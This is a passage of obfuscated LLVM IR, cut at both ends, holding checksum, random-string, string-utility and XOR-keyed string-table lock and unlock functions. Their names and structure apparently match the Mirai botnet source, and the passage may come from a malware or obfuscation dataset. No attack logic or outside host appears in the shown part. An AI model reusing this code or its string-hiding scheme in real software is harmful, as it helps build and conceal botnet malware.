  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %25

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, 3857568653818691250
  %16 = add i64 %15, %13
  %17 = add i64 %16, 3857568653818691250
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 %20, -1133678804
  %22 = sub i32 %21, 2
  %23 = add i32 %22, -1133678804
  %24 = sub i32 %20, 2
  store i32 %23, i32* %4, align 4
  br label %6

; <label>:25:                                     ; preds = %6
  %26 = load i32, i32* %4, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %39

; <label>:28:                                     ; preds = %25
  %29 = load i16*, i16** %3, align 8
  %30 = load i16, i16* %29, align 2
  %31 = trunc i16 %30 to i8
  %32 = sext i8 %31 to i64
  %33 = load i64, i64* %5, align 8
  %34 = sub i64 0, %33
  %35 = sub i64 0, %32
  %36 = add i64 %34, %35
  %37 = sub i64 0, %36
  %38 = add i64 %33, %32
  store i64 %37, i64* %5, align 8
  br label %39

; <label>:39:                                     ; preds = %28, %25
  %40 = load i64, i64* %5, align 8
  %41 = lshr i64 %40, 16
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 %42, -1
  %44 = xor i64 65535, -1
  %45 = xor i64 6797879278944884401, -1
  %46 = or i64 %43, %44
  %47 = or i64 6797879278944884401, %45
  %48 = xor i64 %46, -1
  %49 = and i64 %48, %47
  %50 = and i64 %42, 65535
  %51 = sub i64 0, %41
  %52 = sub i64 0, %49
  %53 = add i64 %51, %52
  %54 = sub i64 0, %53
  %55 = add i64 %41, %49
  store i64 %54, i64* %5, align 8
  %56 = load i64, i64* %5, align 8
  %57 = lshr i64 %56, 16
  %58 = load i64, i64* %5, align 8
  %59 = sub i64 0, %57
  %60 = sub i64 %58, %59
  %61 = add i64 %58, %57
  store i64 %60, i64* %5, align 8
  %62 = load i64, i64* %5, align 8
  %63 = xor i64 %62, -1
  %64 = and i64 -1, %63
  %65 = xor i64 -1, -1
  %66 = and i64 %62, %65
  %67 = or i64 %64, %66
  %68 = xor i64 %62, -1
  %69 = trunc i64 %67 to i16
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %42

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 %30, -1778892974
  %32 = add i32 %31, %29
  %33 = add i32 %32, -1778892974
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = add i32 %37, -645009822
  %39 = sub i32 %38, 2
  %40 = sub i32 %39, -645009822
  %41 = sub nsw i32 %37, 2
  store i32 %40, i32* %8, align 4
  br label %23

; <label>:42:                                     ; preds = %23
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, 1
  br i1 %44, label %45, label %56

; <label>:45:                                     ; preds = %42
  %46 = load i16*, i16** %9, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = load i32, i32* %12, align 4
  %51 = sub i32 0, %50
  %52 = sub i32 0, %49
  %53 = add i32 %51, %52
  %54 = sub i32 0, %53
  %55 = add i32 %50, %49
  store i32 %54, i32* %12, align 4
  br label %56

; <label>:56:                                     ; preds = %45, %42
  %57 = load i32, i32* %10, align 4
  %58 = lshr i32 %57, 16
  %59 = xor i32 65535, -1
  %60 = xor i32 %58, %59
  %61 = and i32 %60, %58
  %62 = and i32 %58, 65535
  %63 = load i32, i32* %12, align 4
  %64 = sub i32 0, %61
  %65 = sub i32 %63, %64
  %66 = add i32 %63, %61
  store i32 %65, i32* %12, align 4
  %67 = load i32, i32* %10, align 4
  %68 = xor i32 %67, -1
  %69 = xor i32 65535, -1
  %70 = xor i32 1136132345, -1
  %71 = or i32 %68, %69
  %72 = or i32 1136132345, %70
  %73 = xor i32 %71, -1
  %74 = and i32 %73, %72
  %75 = and i32 %67, 65535
  %76 = load i32, i32* %12, align 4
  %77 = sub i32 0, %74
  %78 = sub i32 %76, %77
  %79 = add i32 %76, %74
  store i32 %78, i32* %12, align 4
  %80 = load i32, i32* %11, align 4
  %81 = lshr i32 %80, 16
  %82 = xor i32 %81, -1
  %83 = xor i32 65535, -1
  %84 = xor i32 -1732475236, -1
  %85 = or i32 %82, %83
  %86 = or i32 -1732475236, %84
  %87 = xor i32 %85, -1
  %88 = and i32 %87, %86
  %89 = and i32 %81, 65535
  %90 = load i32, i32* %12, align 4
  %91 = sub i32 0, %88
  %92 = sub i32 %90, %91
  %93 = add i32 %90, %88
  store i32 %92, i32* %12, align 4
  %94 = load i32, i32* %11, align 4
  %95 = xor i32 %94, -1
  %96 = xor i32 65535, -1
  %97 = xor i32 434976881, -1
  %98 = or i32 %95, %96
  %99 = or i32 434976881, %97
  %100 = xor i32 %98, -1
  %101 = and i32 %100, %99
  %102 = and i32 %94, 65535
  %103 = load i32, i32* %12, align 4
  %104 = sub i32 0, %101
  %105 = sub i32 %103, %104
  %106 = add i32 %103, %101
  store i32 %105, i32* %12, align 4
  %107 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %108 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %107, i32 0, i32 6
  %109 = load i8, i8* %108, align 1
  %110 = zext i8 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #7
  %112 = zext i16 %111 to i32
  %113 = load i32, i32* %12, align 4
  %114 = add i32 %113, -1843526627
  %115 = add i32 %114, %112
  %116 = sub i32 %115, -1843526627
  %117 = add i32 %113, %112
  store i32 %116, i32* %12, align 4
  %118 = load i16, i16* %7, align 2
  %119 = zext i16 %118 to i32
  %120 = load i32, i32* %12, align 4
  %121 = add i32 %120, -695768828
  %122 = add i32 %121, %119
  %123 = sub i32 %122, -695768828
  %124 = add i32 %120, %119
  store i32 %123, i32* %12, align 4
  br label %125

; <label>:125:                                    ; preds = %129, %56
  %126 = load i32, i32* %12, align 4
  %127 = lshr i32 %126, 16
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %141

; <label>:129:                                    ; preds = %125
  %130 = load i32, i32* %12, align 4
  %131 = xor i32 65535, -1
  %132 = xor i32 %130, %131
  %133 = and i32 %132, %130
  %134 = and i32 %130, 65535
  %135 = load i32, i32* %12, align 4
  %136 = lshr i32 %135, 16
  %137 = add i32 %133, 545639615
  %138 = add i32 %137, %136
  %139 = sub i32 %138, 545639615
  %140 = add i32 %133, %136
  store i32 %139, i32* %12, align 4
  br label %125

; <label>:141:                                    ; preds = %125
  %142 = load i32, i32* %12, align 4
  %143 = xor i32 %142, -1
  %144 = and i32 -1, %143
  %145 = xor i32 -1, -1
  %146 = and i32 %142, %145
  %147 = or i32 %144, %146
  %148 = xor i32 %142, -1
  %149 = trunc i32 %147 to i16
  ret i16 %149
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 -509133802, %6
  %8 = xor i32 -509133802, -1
  %9 = and i32 %5, %8
  %10 = xor i32 %4, -1
  %11 = and i32 %10, -509133802
  %12 = and i32 %4, %8
  %13 = or i32 %7, %9
  %14 = or i32 %11, %12
  %15 = xor i32 %13, %14
  %16 = xor i32 %5, %4
  store i32 %15, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = lshr i32 %17, 8
  %19 = load i32, i32* %1, align 4
  %20 = xor i32 %19, -1
  %21 = and i32 %18, %20
  %22 = xor i32 %18, -1
  %23 = and i32 %19, %22
  %24 = or i32 %21, %23
  %25 = xor i32 %19, %18
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %31, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %31, %30
  store i32 %36, i32* @w, align 4
  %38 = load i32, i32* %1, align 4
  %39 = load i32, i32* @w, align 4
  %40 = xor i32 %39, -1
  %41 = and i32 %38, %40
  %42 = xor i32 %38, -1
  %43 = and i32 %39, %42
  %44 = or i32 %41, %43
  %45 = xor i32 %39, %38
  store i32 %44, i32* @w, align 4
  %46 = load i32, i32* @w, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %68, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %69

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %23

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 0, 4
  %20 = add i64 %18, %19
  %21 = sub i64 %18, 4
  %22 = trunc i64 %20 to i32
  store i32 %22, i32* %4, align 4
  br label %68

; <label>:23:                                     ; preds = %8
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  br i1 %25, label %26, label %48

; <label>:26:                                     ; preds = %23
  %27 = call i32 @rand_next()
  %28 = xor i32 %27, -1
  %29 = xor i32 65535, -1
  %30 = xor i32 361932158, -1
  %31 = or i32 %28, %29
  %32 = or i32 361932158, %30
  %33 = xor i32 %31, -1
  %34 = and i32 %33, %32
  %35 = and i32 %27, 65535
  %36 = trunc i32 %34 to i16
  %37 = load i8*, i8** %3, align 8
  %38 = bitcast i8* %37 to i16*
  store i16 %36, i16* %38, align 2
  %39 = load i8*, i8** %3, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 2
  store i8* %40, i8** %3, align 8
  %41 = load i32, i32* %4, align 4
  %42 = sext i32 %41 to i64
  %43 = add i64 %42, 6808945456797674997
  %44 = sub i64 %43, 2
  %45 = sub i64 %44, 6808945456797674997
  %46 = sub i64 %42, 2
  %47 = trunc i64 %45 to i32
  store i32 %47, i32* %4, align 4
  br label %67

; <label>:48:                                     ; preds = %23
  %49 = call i32 @rand_next()
  %50 = xor i32 %49, -1
  %51 = xor i32 255, -1
  %52 = xor i32 1763729275, -1
  %53 = or i32 %50, %51
  %54 = or i32 1763729275, %52
  %55 = xor i32 %53, -1
  %56 = and i32 %55, %54
  %57 = and i32 %49, 255
  %58 = trunc i32 %56 to i8
  %59 = load i8*, i8** %3, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %3, align 8
  store i8 %58, i8* %59, align 1
  %61 = load i32, i32* %4, align 4
  %62 = sub i32 0, %61
  %63 = sub i32 0, -1
  %64 = add i32 %62, %63
  %65 = sub i32 0, %64
  %66 = add nsw i32 %61, -1
  store i32 %65, i32* %4, align 4
  br label %67

; <label>:67:                                     ; preds = %48, %26
  br label %68

; <label>:68:                                     ; preds = %67, %11
  br label %5

; <label>:69:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 255, -1
  %15 = xor i32 1144027732, -1
  %16 = or i32 %13, %14
  %17 = or i32 1144027732, %15
  %18 = xor i32 %16, -1
  %19 = and i32 %18, %17
  %20 = and i32 %12, 255
  %21 = trunc i32 %19 to i8
  store i8 %21, i8* %5, align 1
  %22 = load i32, i32* @table_key, align 4
  %23 = lshr i32 %22, 8
  %24 = xor i32 %23, -1
  %25 = xor i32 255, -1
  %26 = xor i32 -451247701, -1
  %27 = or i32 %24, %25
  %28 = or i32 -451247701, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %23, 255
  %32 = trunc i32 %30 to i8
  store i8 %32, i8* %6, align 1
  %33 = load i32, i32* @table_key, align 4
  %34 = lshr i32 %33, 16
  %35 = xor i32 %34, -1
  %36 = xor i32 255, -1
  %37 = xor i32 88720687, -1
  %38 = or i32 %35, %36
  %39 = or i32 88720687, %37
  %40 = xor i32 %38, -1
  %41 = and i32 %40, %39
  %42 = and i32 %34, 255
  %43 = trunc i32 %41 to i8
  store i8 %43, i8* %7, align 1
  %44 = load i32, i32* @table_key, align 4
  %45 = lshr i32 %44, 24
  %46 = xor i32 255, -1
  %47 = xor i32 %45, %46
  %48 = and i32 %47, %45
  %49 = and i32 %45, 255
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %142, %1
  %52 = load i32, i32* %3, align 4
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 1
  %55 = load i16, i16* %54, align 8
  %56 = zext i16 %55 to i32
  %57 = icmp slt i32 %52, %56
  br i1 %57, label %58, label %149

; <label>:58:                                     ; preds = %51
  %59 = load i8, i8* %5, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, -1
  %70 = and i32 -349536223, %69
  %71 = xor i32 -349536223, -1
  %72 = and i32 %68, %71
  %73 = xor i32 %60, -1
  %74 = and i32 %73, -349536223
  %75 = and i32 %60, %71
  %76 = or i32 %70, %72
  %77 = or i32 %74, %75
  %78 = xor i32 %76, %77
  %79 = xor i32 %68, %60
  %80 = trunc i32 %78 to i8
  store i8 %80, i8* %66, align 1
  %81 = load i8, i8* %6, align 1
  %82 = zext i8 %81 to i32
  %83 = load %struct.table_value*, %struct.table_value** %4, align 8
  %84 = getelementptr inbounds %struct.table_value, %struct.table_value* %83, i32 0, i32 0
  %85 = load i8*, i8** %84, align 8
  %86 = load i32, i32* %3, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = xor i32 %90, -1
  %92 = and i32 -247532709, %91
  %93 = xor i32 -247532709, -1
  %94 = and i32 %90, %93
  %95 = xor i32 %82, -1
  %96 = and i32 %95, -247532709
  %97 = and i32 %82, %93
  %98 = or i32 %92, %94
  %99 = or i32 %96, %97
  %100 = xor i32 %98, %99
  %101 = xor i32 %90, %82
  %102 = trunc i32 %100 to i8
  store i8 %102, i8* %88, align 1
  %103 = load i8, i8* %7, align 1
  %104 = zext i8 %103 to i32
  %105 = load %struct.table_value*, %struct.table_value** %4, align 8
  %106 = getelementptr inbounds %struct.table_value, %struct.table_value* %105, i32 0, i32 0
  %107 = load i8*, i8** %106, align 8
  %108 = load i32, i32* %3, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = sext i8 %111 to i32
  %113 = xor i32 %112, -1
  %114 = and i32 %104, %113
  %115 = xor i32 %104, -1
  %116 = and i32 %112, %115
  %117 = or i32 %114, %116
  %118 = xor i32 %112, %104
  %119 = trunc i32 %117 to i8
  store i8 %119, i8* %110, align 1
  %120 = load i8, i8* %8, align 1
  %121 = zext i8 %120 to i32
  %122 = load %struct.table_value*, %struct.table_value** %4, align 8
  %123 = getelementptr inbounds %struct.table_value, %struct.table_value* %122, i32 0, i32 0
  %124 = load i8*, i8** %123, align 8
  %125 = load i32, i32* %3, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i8, i8* %124, i64 %126
  %128 = load i8, i8* %127, align 1
  %129 = sext i8 %128 to i32
  %130 = xor i32 %129, -1
  %131 = and i32 -2120166499, %130
  %132 = xor i32 -2120166499, -1
  %133 = and i32 %129, %132
  %134 = xor i32 %121, -1
  %135 = and i32 %134, -2120166499
  %136 = and i32 %121, %132
  %137 = or i32 %131, %133
  %138 = or i32 %135, %136
  %139 = xor i32 %137, %138
  %140 = xor i32 %129, %121
  %141 = trunc i32 %139 to i8
  store i8 %141, i8* %127, align 1
  br label %142

; <label>:142:                                    ; preds = %58
  %143 = load i32, i32* %3, align 4
  %144 = sub i32 0, %143
  %145 = sub i32 0, 1
  %146 = add i32 %144, %145
  %147 = sub i32 0, %146
  %148 = add nsw i32 %143, 1
  store i32 %147, i32* %3, align 4
  br label %51

; <label>:149:                                    ; preds = %51
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  store i32 %13, i32* %3, align 4
  br label %4

; <label>:15:                                     ; preds = %4
  %16 = load i32, i32* %3, align 4
  ret i32 %16
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strncmp(i8*, i8*, i32) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %8, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @util_strlen(i8* %12)
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %7, align 4
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %21, label %17

; <label>:17:                                     ; preds = %3
  %18 = load i32, i32* %9, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17, %3
  store i8 0, i8* %4, align 1
  br label %43

; <label>:22:                                     ; preds = %17
  br label %23

; <label>:23:                                     ; preds = %41, %22
  %24 = load i32, i32* %7, align 4
  %25 = add i32 %24, -1605328622
  %26 = add i32 %25, -1
  %27 = sub i32 %26, -1605328622
  %28 = add nsw i32 %24, -1
  store i32 %27, i32* %7, align 4
  %29 = icmp ne i32 %24, 0
  br i1 %29, label %30, label %42

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %5, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %5, align 8
  %33 = load i8, i8* %31, align 1
  %34 = sext i8 %33 to i32
  %35 = load i8*, i8** %6, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %6, align 8
  %37 = load i8, i8* %35, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp ne i32 %34, %38
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %30
  store i8 0, i8* %4, align 1
  br label %43

; <label>:41:                                     ; preds = %30
  br label %23

; <label>:42:                                     ; preds = %23
  store i8 1, i8* %4, align 1
  br label %43

; <label>:43:                                     ; preds = %42, %40, %21
  %44 = load i8, i8* %4, align 1
  ret i8 %44
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strcmp(i8*, i8*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %8 = load i8*, i8** %4, align 8
  %9 = call i32 @util_strlen(i8* %8)
  store i32 %9, i32* %6, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* %6, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp ne i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %2
  store i8 0, i8* %3, align 1
  br label %37

; <label>:16:                                     ; preds = %2
  br label %17

; <label>:17:                                     ; preds = %35, %16
  %18 = load i32, i32* %6, align 4
  %19 = sub i32 %18, 151162144
  %20 = add i32 %19, -1
  %21 = add i32 %20, 151162144
  %22 = add nsw i32 %18, -1
  store i32 %21, i32* %6, align 4
  %23 = icmp ne i32 %18, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %17
  %25 = load i8*, i8** %4, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %4, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  %29 = load i8*, i8** %5, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %5, align 8
  %31 = load i8, i8* %29, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp ne i32 %28, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %24
  store i8 0, i8* %3, align 1
  br label %37

; <label>:35:                                     ; preds = %24
  br label %17

; <label>:36:                                     ; preds = %17
  store i8 1, i8* %3, align 1
  br label %37

; <label>:37:                                     ; preds = %36, %34, %15
  %38 = load i8, i8* %3, align 1
  ret i8 %38
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = sub i32 %10, 1619354869
  %12 = add i32 %11, 1
  %13 = add i32 %12, 1619354869
  %14 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %13)
  %15 = load i32, i32* %5, align 4
  ret i32 %15
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %17, %3
  %12 = load i32, i32* %6, align 4
  %13 = sub i32 0, -1
  %14 = sub i32 %12, %13
  %15 = add nsw i32 %12, -1
  store i32 %14, i32* %6, align 4
  %16 = icmp ne i32 %12, 0
  br i1 %16, label %17, label %23

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %8, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %8, align 8
  %20 = load i8, i8* %18, align 1
  %21 = load i8*, i8** %7, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %7, align 8
  store i8 %20, i8* %21, align 1
  br label %11

; <label>:23:                                     ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %14, %2
  %8 = load i32, i32* %4, align 4
  %9 = sub i32 %8, 846510117
